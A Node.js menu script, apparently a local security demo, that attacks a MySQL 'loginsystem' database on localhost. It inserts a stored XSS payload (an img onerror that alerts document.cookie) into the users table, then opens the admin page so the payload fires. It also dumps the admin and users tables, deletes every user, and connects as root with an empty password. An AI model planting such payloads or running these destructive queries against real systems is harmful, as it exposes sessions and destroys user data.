
/**  connects to database */
function connectToDatabase() {
	const sql = require('mysql');

	return sql.createPool({
		host: "localhost",
		user: "root",
		password: "",
		database: "loginsystem"
    });
}


/**shows off the stuff that can be done */
function showInitialActions() {
	console.log("Please choose one of the following actions: ");
	const actions = [
		"Show all tables of the database.",
		"Insert an XSS attack.",
		"Show rows of a specific table.",
		"Delete all users",
		"Exit."
	];
	let index = 1;
	for (let action of actions) {
		console.log(index, "->", action);
		index++;
	}}


/**  reads input from the user */
	function readUserInput(message) {
		const prompt = require('prompt-sync')();
		const input = prompt(message);
		return input;
	}



function main() {
	readUserInput("Press enter to continue: ");

	let action = "0";
	showInitialActions();
	action = readUserInput("Insert the action that you would like: ");

	switch (action) {
		case "1":
			showAllTables();
			break;
		case "2":
			insertXSS();
			break;
		case "3":
			showDataOfATable();
			break;
		case "4":
			deleteUsers();
			break;
		case "5":
			process.exit(0);
			break;
		default:
			console.log("Invalid input!");
			main();
			break;
	}
}


/**executes query */
function execute(sqlQuery, o = false) {
	const con = connectToDatabase();
	con.query(sqlQuery, function (error, result) {
		if (error) console.log(" try again!");
		if (o) {
			var opn = require('opn');
			opn('http://localhost/loginsystem/admin/manage-users.php');
		}
		else
			console.log(result)
		main();
	});
}


/**gives the user the possibility to view all the tables*/
function showAllTables() {
	const query = "show tables;";
	execute(query, false);
}


/**  inserts the XSS attack*/
function insertXSS() {
	console.log("Choose one of the following actions: ");
	const output = readUserInput("Press enter to insert attack:");
	let sqlQuery;
	message = output;
	sqlQuery = `INSERT INTO users (fname) VALUES ('<img src="x" onerror=alert(document.cookie)>')`;
	execute(sqlQuery, true);			
}

/**  this will show the data of a specific table: admin or users depending on what the user types*/
function showDataOfATable() {
	
	const tableName = readUserInput("Enter admin or users: ");
	if (tableName == "admin") {
		const request = `select * from ${tableName}`;
		execute(request);
	}
	else if (tableName == "users") {
		const request = `select * from ${tableName}`;
		execute(request);
	}
	else
		main();
}

/**deletes all users from the users table of the database*/
function deleteUsers() {
	console.log("This will delete users");
	const query = "delete from users;";
	execute(query, true);
}

console.log("Are you ready?");
main();